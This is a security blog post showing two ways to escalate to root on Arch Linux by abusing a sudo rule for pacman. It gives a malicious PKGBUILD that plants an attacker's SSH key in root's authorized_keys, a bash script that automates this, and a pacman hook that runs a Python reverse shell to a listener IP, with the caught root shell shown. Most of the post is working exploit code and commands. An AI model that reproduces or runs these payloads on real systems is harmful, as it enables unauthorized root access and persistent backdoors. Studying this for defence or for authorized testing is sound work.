---
title: Privilege Escalation via Pacman
author: Saad
date: 2024-11-19 00:00:00 +0500
categories:
  - Tips & Tricks
tags:
  - privesc
  - pacman
  - arch
  - privilege escalation
  - pacman privesc
  - makepkg
  - malicious pkg
  - abusing pacman
  - root via pacman
image: pacman.jpg
media_subpath: /assets/img/pacman
---

Privilege escalation with `pacman`.

> Pacman is Arch Linux's package manager for installing, updating, and managing software with `.pkg.tar.zst` files via a simple command-line interface, 

If the user has sudo permission to run `pacman`, we can easily escalate privileges to root.
```bash
[skid@arch]$ sudo -l 
User skid may run the following commands on arch:    
 (ALL : ALL) NOPASSWD: /usr/bin/pacman
```
## I

### Required stuff

- [PKGBUILD](https://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/#what-is-pkgbuild) shell script with the code provided below.
- SSH key pair, with the public key renamed (e.g., `id_rsa.pub`) to `authorized_keys`.
- Build the package using [makepkg](https://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/#what-is-makepkg).
- Install the package.

##### **What is PKGBUILD?**

> PKGBUILD is a shell script used in Arch Linux to define how a package is built, including metadata (name, version, description), dependencies, source files, and the steps to compile/install it. It's processed by `makepkg` to create an installable `.pkg.tar.zst` for `pacman`. You can read more about it on [Arch Linux btw Wiki](https://wiki.archlinux.org/title/PKGBUILD).

First, create a directory and name it whatever you want:
```bash
[skid@arch]$ mkdir priv && cd priv
[skid@arch priv]$ nano PKGBUILD
```

In the `PKGBUILD` file, add the following content:
```bash
pkgname=privesc
pkgver=1.0
pkgrel=1
pkgdesc="Privilege escalation"
arch=('any')
url="http://example.com"
license=('GPL')
depends=()
makedepends=()
source=('authorized_keys')
sha256sums=('SKIP')
package() {
  install -Dm755 "$srcdir/authorized_keys" "$pkgdir/root/.ssh/authorized_keys"
}
```

### SSH Access
Now, generate SSH keys on the target machine, and rename `id_rsa.pub` to `authorized_keys`:
```bash
[skid@arch]$ ssh-keygen -t rsa -b 4096 -f id_rsa -N "" 
```

```bash
[skid@arch]$ mv id_rsa.pub authorized_keys
```

> This malicious package script is designed to add our public SSH key to root's authorized_keys.

### Execute it

##### **What is `makepkg`?**
> `makepkg` is a tool in Arch Linux used to build packages from source using a `PKGBUILD` script. It compiles the software and creates an installable `.pkg.tar.zst` package for use with `pacman`. You can read more about it on [here](https://wiki.archlinux.org/title/Makepkg)

Next, run `makepkg` in the directory containing the `PKGBUILD` script:
```bash
[skid@arch priv]$ makepkg
```

After generating the package, transfer the `id_rsa` private key to your own machine and set its permissions to `600`:
```bash
[skid@arch] chmod 600 id_rsa
```

The `makepkg` command should produce a `.zst` file, such as `privesc-1.0-1-any.pkg.tar.zst`. Finally, install this package with `pacman`:
```bash
[skid@arch priv]$ sudo /usr/bin/pacman -U /home/skid/priv/privesc-1.0-1-any.pkg.tar.zst
```
This will add your SSH key to the root user's authorized_keys, allowing root access via SSH.

### Bash Script
Just a bash script to do all the crap in snap.
```bash
#!/bin/bash

# Create a working directory
mkdir priv && cd priv

# Generate PKGBUILD file
cat <<EOF >PKGBUILD
pkgname=privesc
pkgver=1.0
pkgrel=1
pkgdesc="Privilege Escalation Package"
arch=('any')
url="http://example.com"
license=('GPL')
depends=()
makedepends=()
source=('authorized_keys')
sha256sums=('SKIP')
package() {
  install -Dm755 "\$srcdir/authorized_keys" "\$pkgdir/root/.ssh/authorized_keys"
}
EOF

# Generate SSH keys
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
mv id_rsa.pub authorized_keys

# Build the malicious package
makepkg

# Output message
echo "Malicious package created! Run the following command to deploy:"
echo "sudo pacman -U $(pwd)/privesc-1.0-1-any.pkg.tar.zst"
echo "Don't forget to secure your private key: id_rsa"

```

## II

### Required stuff

- Local copy of `pacman.conf` in a writeable directory (e.g. `/dev/shm`).
- A directory to hold [hooks](https://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/#what-are-hooks-for-pacmanconf), create under `/dev/shm`.
- A hook file (e.g. `test.hook`) in hook directory. (`/dev/shm/hook/test.hook`)
- Update the local copy of `pacman.conf` the path of hook dir with your one.
- Remove an installed pkg to trigger it.

#### Details

#### **pacman.conf**
> pacman.conf is the main configuration file for the pacman package manager in Arch Linux. It defines settings for package installation, updates, and repository management, including repository sources, options for handling dependencies, file locations, and hook settings. The file is typically located at `/etc/pacman.conf.`

##### **What are Hooks? (for pacman.conf)**
> Hooks in pacman.conf automate tasks before or after package operations, like clearing caches, updating databases, or triggering systemd services, based on defined events (e.g., package install or removal). You can read more about it on [Here](https://wiki.archlinux.org/title/Pacman#Hooks). 

##### **Why use Hooks for Privilege Escalation?**
> Pacman hooks can execute system commands during specific package operations, such as installation, upgrades, or removal. By defining an `[Action]` and setting `When = PreTransaction`, you can run arbitrary commands or scripts before the transaction begins. 

**For example this code snippet:**

```bash
[Action]
When = PreTransaction
Exec = /bin/sh -c "python3 /opt/set_dev_env.py"
```

#### Implementing it

Make a copy of pacman:
```bash
[skid@arch] cp /etc/pacman.conf /dev/shm/pacman.conf
```

Edit it and update the `HookDir` under `[options]`
```bash
[skid@arch] nano /dev/shm/pacman.conf
```
Like this:
```bash
<SNIP>
[options]
# The following paths are commented out with their default values listed.
# If you wish to use different paths, uncomment and update the paths.
#RootDir     = /
#DBPath      = /var/lib/pacman/
#CacheDir    = /var/cache/pacman/pkg/
#LogFile     = /var/log/pacman.log
#GPGDir      = /etc/pacman.d/gnupg/
HookDir     = /dev/shm/hooks/
<SNIP>
```
> Uncomment `#HookDir`, make sure it's not commented out else you won't be shelling the arch skids.

### test.hook
Create a directory to hold hooks:
```
[skid@arch]$ mkdir /dev/shm/hooks 
```
Then create a `test.hook`:

`test.hook`
```bash
[Trigger]
Operation = Install
Operation = Upgrade
Operation = Remove
Type = Package
Target = *

[Action]
When = PreTransaction
Exec = /bin/sh -c "python3 /dev/shm/shell.py IP 9001 &"
```
> You can find more example hooks on [here](https://github.com/andrewgregory/pachooks).

`shell.py`

```py
#!/usr/bin/env python
import os
import socket
import sys
import pty

if os.fork() == 0:
    cb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cb.connect((sys.argv[1], int(sys.argv[2])))

    os.dup2(cb.fileno(), 0)
    os.dup2(cb.fileno(), 1)
    os.dup2(cb.fileno(), 2)

    pty.spawn("/bin/sh")

    cb.close()
```
### Executing it

Now we have all what we need, let's remove a pkg. 
I'll remove chromium.

```bash
[skid@arch]$ sudo /usr/bin/pacman --config /dev/shm/pacman.conf -R chromium
```
On the other hand, there is a shell:

```
[seadris@skid.com]➜ ~ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.x] from (UNKNOWN) [10.129.x.x] 50666
sh-5.2#
```

Thanks to my lovely friends!

Thanks to you for reading my blog, have a great day cutie pie btw!
![PEPE](https://media.tenor.com/anVMFFvkDG0AAAAe/pepe-hacker.png)